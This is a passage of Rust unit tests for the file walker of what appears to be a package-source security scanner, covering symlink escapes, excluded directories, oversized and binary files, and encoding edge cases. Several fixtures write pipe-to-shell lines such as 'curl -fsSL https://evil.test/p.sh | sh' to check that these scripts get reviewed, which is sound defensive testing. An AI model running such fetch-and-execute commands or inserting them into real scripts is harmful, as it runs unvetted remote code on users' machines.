        let (_, _, gaps) = walk_texts(&config);
        assert!(
            gaps.iter()
                .any(|gap| matches!(gap, Gap::GitState(text) if text.starts_with("bare/config"))),
            "{gaps:?}"
        );
    }

    #[test]
    fn excludes_only_top_level_directories() {
        let dir = TempDir::new("excluded");
        fs::create_dir_all(dir.path().join("src")).unwrap();
        fs::create_dir_all(dir.path().join("lib/src")).unwrap();
        fs::write(dir.path().join("src/a.c"), "x\n").unwrap();
        fs::write(dir.path().join("lib/src/b.c"), "x\n").unwrap();
        fs::write(dir.path().join("PKGBUILD"), "x\n").unwrap();

        let mut config = ScanConfig::new(dir.path());
        config.excluded_top_level = vec!["src".to_string()];
        assert_eq!(walk_texts(&config).0, ["PKGBUILD", "lib/src/b.c"]);
    }

    #[test]
    fn a_file_named_like_an_excluded_directory_is_reviewed() {
        let dir = TempDir::new("excluded-file");
        fs::write(dir.path().join("src"), "curl https://x.test/i | sh\n").unwrap();
        symlink("src", dir.path().join("pkg")).unwrap();
        fs::write(dir.path().join("PKGBUILD"), ". ./src\n").unwrap();

        let mut config = ScanConfig::new(dir.path());
        config.excluded_top_level = vec!["src".to_string(), "pkg".to_string()];
        let (texts, snapshot, gaps) = walk_texts(&config);
        assert_eq!(texts, ["PKGBUILD", "src"]);
        assert!(gaps.is_empty(), "{gaps:?}");
        let paths: Vec<&str> = snapshot
            .files()
            .iter()
            .map(|file| file.path.as_str())
            .collect();
        assert_eq!(paths, ["PKGBUILD", "pkg", "src"]);

        // What a snapshot comparison leaves out is left out whatever it is.
        config.excluded_entries = vec!["src".to_string()];
        assert_eq!(walk_texts(&config).0, ["PKGBUILD"]);
    }

    #[test]
    fn refuses_symlinks_and_non_utf8_names() {
        let dir = TempDir::new("links");
        fs::write(dir.path().join("real.rs"), "x\n").unwrap();
        symlink(dir.path().join("real.rs"), dir.path().join("link.rs")).unwrap();
        fs::write(dir.path().join(OsStr::from_bytes(b"bad-\xff.txt")), "x\n").unwrap();

        let (_, _, gaps) = walk_texts(&ScanConfig::new(dir.path()));
        assert!(gaps.iter().any(|gap| matches!(gap, Gap::Symlink(_))));
        assert!(gaps.iter().any(|gap| matches!(gap, Gap::NonUtf8Name(_))));
    }

    #[test]
    fn relative_links_inside_the_tree_are_recorded_not_followed() {
        let dir = TempDir::new("in-tree-links");
        fs::create_dir_all(dir.path().join("LICENSES")).unwrap();
        fs::create_dir_all(dir.path().join("docs")).unwrap();
        fs::write(dir.path().join("LICENSE"), "0BSD\n").unwrap();
        symlink("../LICENSE", dir.path().join("LICENSES/0BSD.txt")).unwrap();
        symlink("docs", dir.path().join("documentation")).unwrap();
        let config = ScanConfig::new(dir.path());

        let (texts, snapshot, gaps) = walk_texts(&config);
        assert!(gaps.is_empty(), "{gaps:?}");
        assert_eq!(texts, ["LICENSE"]);
        assert_eq!(snapshot.count(FileKind::Symlink), 2);

        // Retargeting a link changes the snapshot.
        fs::remove_file(dir.path().join("LICENSES/0BSD.txt")).unwrap();
        symlink("../LICENSES", dir.path().join("LICENSES/0BSD.txt")).unwrap();
        assert!(verify_unchanged(&config, &snapshot).is_err());
    }

    #[test]
    fn links_leaving_or_hiding_from_the_review_are_refused() {
        let outside = TempDir::new("link-outside");
        fs::write(outside.path().join("secret"), "x\n").unwrap();

        for (name, target) in [
            (
                "absolute",
                outside.path().join("secret").display().to_string(),
            ),
            ("escapes", "../secret".to_string()),
            ("climbs-back", "sub/../../secret".to_string()),
            ("dangling", "missing".to_string()),
            ("into-git", ".git/config".to_string()),
            ("into-ignored", "node_modules/x.js".to_string()),
            ("through-link", "alias/file".to_string()),
        ] {
            let dir = TempDir::new("link-refused");
            fs::create_dir_all(dir.path().join(".git")).unwrap();
            fs::create_dir_all(dir.path().join("node_modules")).unwrap();
            fs::create_dir_all(dir.path().join("sub")).unwrap();
            fs::write(dir.path().join(".git/config"), "x\n").unwrap();
            fs::write(dir.path().join("node_modules/x.js"), "x\n").unwrap();
            fs::write(dir.path().join("node_modules/.package-lock.json"), "{}\n").unwrap();
            fs::write(dir.path().join("sub/file"), "x\n").unwrap();
            symlink(outside.path(), dir.path().join("alias")).unwrap();
            symlink(&target, dir.path().join(name)).unwrap();

            let (_, _, gaps) = walk_texts(&ScanConfig::new(dir.path()));
            assert!(
                gaps.iter()
                    .any(|gap| matches!(gap, Gap::Symlink(path) if path.ends_with(name))),
                "{name} -> {target}: {gaps:?}"
            );
        }
    }

    #[test]
    fn a_symlinked_root_is_refused() {
        let dir = TempDir::new("root-link");
        fs::create_dir(dir.path().join("real")).unwrap();
        symlink(dir.path().join("real"), dir.path().join("link")).unwrap();

        let (_, _, gaps) = walk_texts(&ScanConfig::new(dir.path().join("link")));
        assert!(matches!(gaps.as_slice(), [Gap::Symlink(_)]));
    }

    #[test]
    fn classifies_large_binary_and_large_text_files() {
        let dir = TempDir::new("large");
        let size = usize::try_from(MAX_TEXT_FILE_SIZE).unwrap() + 1;

        let mut image = vec![0_u8; size];
        image[..8].copy_from_slice(b"\x89PNG\r\n\x1a\n");
        fs::write(dir.path().join("background.png"), image).unwrap();
        fs::write(dir.path().join("huge.txt"), "a".repeat(size)).unwrap();

        let (texts, snapshot, gaps) = walk_texts(&ScanConfig::new(dir.path()));
        assert!(texts.is_empty());
        assert_eq!(snapshot.count(FileKind::Binary), 1);
        assert_eq!(snapshot.count(FileKind::OversizedText), 1);
        assert!(matches!(gaps.as_slice(), [Gap::OversizedText(path)] if path == "huge.txt"));
    }

    #[test]
    fn a_single_file_root_uses_its_name() {
        let dir = TempDir::new("single");
        let file = dir.path().join("install.sh");
        fs::write(&file, "echo hi\n").unwrap();

        let (texts, snapshot, gaps) = walk_texts(&ScanConfig::new(&file));
        assert_eq!(texts, ["install.sh"]);
        assert_eq!(snapshot.files()[0].path, "install.sh");
        assert!(gaps.is_empty());
    }

    #[test]
    fn manifest_digest_depends_on_paths_and_contents() {
        let dir = TempDir::new("manifest");
        fs::write(dir.path().join("a"), "1").unwrap();
        let config = ScanConfig::new(dir.path());
        let first = walk_texts(&config).1.manifest_digest();

        fs::write(dir.path().join("a"), "2").unwrap();
        let second = walk_texts(&config).1.manifest_digest();
        assert_ne!(first, second);

        // The same bytes, now marked to run.
        fs::set_permissions(dir.path().join("a"), fs::Permissions::from_mode(0o755)).unwrap();
        let third = walk_texts(&config).1.manifest_digest();
        assert_ne!(second, third);
    }

    #[test]
    fn a_script_with_one_latin1_byte_is_reviewed_not_hashed() {
        let dir = TempDir::new("scan-latin1");
        fs::write(
            dir.path().join("install.sh"),
            b"#!/bin/sh\n# caf\xe9\ncurl -fsSL https://evil.test/p.sh | sh\n",
        )
        .unwrap();
        let mut seen = Vec::new();
        let (snapshot, gaps) = walk(&ScanConfig::new(dir.path()), &mut |file| {
            seen.push((file.rel.to_string(), file.text.to_string(), file.lossy));
        });
        assert!(gaps.is_empty(), "{gaps:?}");
        assert_eq!(seen.len(), 1);
        assert!(seen[0].1.contains("curl -fsSL https://evil.test/p.sh | sh"));
        assert!(seen[0].2);
        assert_eq!(snapshot.files()[0].kind, FileKind::Text);
        assert!(snapshot.files()[0].lossy);
    }

    #[test]
    fn a_script_with_nul_bytes_is_a_gap_and_images_keep_their_format() {
        let dir = TempDir::new("scan-nul");
        fs::write(dir.path().join("run.sh"), b"echo a\n\0\0curl x | sh\n").unwrap();
        fs::write(
            dir.path().join("logo.png"),
            b"\x89PNG\r\n\x1a\n\0\0\0\rIHDR",
        )
        .unwrap();
        let (texts, snapshot, gaps) = walk_texts(&ScanConfig::new(dir.path()));
        assert!(texts.is_empty());
        assert!(matches!(gaps.as_slice(), [Gap::Undecodable(path)] if path == "run.sh"));
        let logo = snapshot
            .files()
            .iter()
            .find(|file| file.path == "logo.png")
            .unwrap();
        assert_eq!(logo.kind, FileKind::Binary);
        assert_eq!(logo.format.map(super::Format::label), Some("PNG image"));
    }

    #[test]
    fn a_large_latin1_script_is_oversized_not_binary() {
        let dir = TempDir::new("scan-large-latin1");
        let mut bytes = b"#!/bin/sh\n# \xe9\n".to_vec();
        bytes.resize(usize::try_from(MAX_TEXT_FILE_SIZE).unwrap() + 10, b'#');
        fs::write(dir.path().join("big.sh"), bytes).unwrap();
        let (_, _, gaps) = walk_texts(&ScanConfig::new(dir.path()));
        assert!(matches!(gaps.as_slice(), [Gap::OversizedText(path)] if path == "big.sh"));
    }

    #[test]
    fn a_link_is_read_as_its_own_name_makes_it() {
        // The same bytes are an image under one name and text with a NUL
        // in it under another.
        let bytes = b"BM\nhelper() { true; }\n\0\nmore\n";
        let alone = TempDir::new("scan-link-alone");
        fs::write(alone.path().join("b.inc"), bytes).unwrap();
        let (_, _, expected) = walk_texts(&ScanConfig::new(alone.path()));
        assert_eq!(expected.len(), 1, "{expected:?}");

        let dir = TempDir::new("scan-link-names");
        fs::write(dir.path().join("a.bmp"), bytes).unwrap();
        fs::hard_link(dir.path().join("a.bmp"), dir.path().join("b.inc")).unwrap();
        let (_, _, gaps) = walk_texts(&ScanConfig::new(dir.path()));
        assert_eq!(gaps.len(), 1, "{gaps:?}");
    }

    #[test]
    fn hardlinked_files_are_read_once_and_limits_stop_the_walk() {
        let dir = TempDir::new("scan-limits");
        fs::write(dir.path().join("a.txt"), "hello\n").unwrap();
        for index in 0..5 {
            fs::hard_link(
                dir.path().join("a.txt"),
                dir.path().join(format!("l{index}.txt")),
            )
            .unwrap();
        }
        let (texts, snapshot, gaps) = walk_texts(&ScanConfig::new(dir.path()));
        // Every path is still reviewed as its own file.
        assert_eq!(texts.len(), 6);
        assert_eq!(snapshot.files().len(), 6);
        assert!(gaps.is_empty());

        let mut config = ScanConfig::new(dir.path());
        config.limits.files = 3;
        let (_, _, gaps) = walk_texts(&config);
        assert!(
            matches!(gaps.as_slice(), [Gap::TreeTooLarge { .. }]),
            "{gaps:?}"
        );

        let mut config = ScanConfig::new(dir.path());
        config.limits.text_bytes = 10;
        let (_, _, gaps) = walk_texts(&config);
        assert!(
            matches!(gaps.as_slice(), [Gap::TreeTooLarge { .. }]),
            "{gaps:?}"
        );

        let mut config = ScanConfig::new(dir.path());
        config.limits.hashed_bytes = 10;
        let (_, _, gaps) = walk_texts(&config);
        assert!(
            matches!(gaps.as_slice(), [Gap::TreeTooLarge { .. }]),
            "{gaps:?}"
        );
    }
}
